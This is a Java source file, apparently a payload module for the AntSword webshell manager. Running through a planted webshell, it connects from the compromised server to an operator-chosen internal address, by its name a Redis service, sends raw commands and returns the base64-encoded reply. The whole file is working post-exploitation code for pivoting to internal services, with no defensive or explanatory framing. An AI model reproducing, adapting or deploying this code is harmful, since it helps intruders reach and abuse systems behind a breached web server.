package other;

import antSword.Template;

import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;

public class RedisConn extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargaddr");
        String z2 = getParam("antswordargcontext");
        return SendData(z1, z2);

    }

    String Base64Encode(String str) {
        String version = System.getProperty("java.version");
        try {
            String ret = "";
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64);
                ret = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, str.getBytes());
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = Base64.getDeclaredConstructor().newInstance();
                ret = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, str.getBytes());
            }
            ret = ret.replaceAll("\r|\n", "");
            return ret;
        } catch (Exception e) {
            return "";
        }
    }

    String SendData(String addr, String context) throws Exception {
        Socket socket = null;
        try {
            socket = createSocket(addr);
        } catch (Exception e) {
            return Base64Encode("ERROR:// " + e.getMessage());
        }
        InputStream is = socket.getInputStream();
        OutputStream os = socket.getOutputStream();
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));
        bw.write(context);
        bw.flush();
//        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        byte[] buf = new byte[1024];
        int len = 0;
        String ret = "";
        try {
            while ((len = is.read(buf)) != -1) {
                ret += new String(buf, 0, len);
            }
//        String l = "";
//        try {
//            while ((l = br.readLine()) != null) {
//                ret += l + "\r\n";
//            }
        } catch (SocketTimeoutException ex) {
            if (ret.length() != 0) {
                return Base64Encode(ret);
            }
        } catch (Exception e) {
            throw e;
        } finally {
            if (socket != null) {
                socket.close();
            }
        }
        return Base64Encode(ret);
    }

    Socket createSocket(String addr) throws Exception {
        Socket socket = null;
        try {
            String[] inet = addr.split(":");
            socket = new Socket();
            socket.setReuseAddress(true);
            socket.setKeepAlive(false);
            socket.setTcpNoDelay(true);
            socket.setSoLinger(true, 0);
            socket.connect(new InetSocketAddress(inet[0], Integer.parseInt(inet[1])), 30);
            socket.setSoTimeout(30);
            return socket;
        } catch (Exception ex) {
            if (socket != null) {
                socket.close();
            }
            ex.printStackTrace();
            throw ex;
        }
    }
}
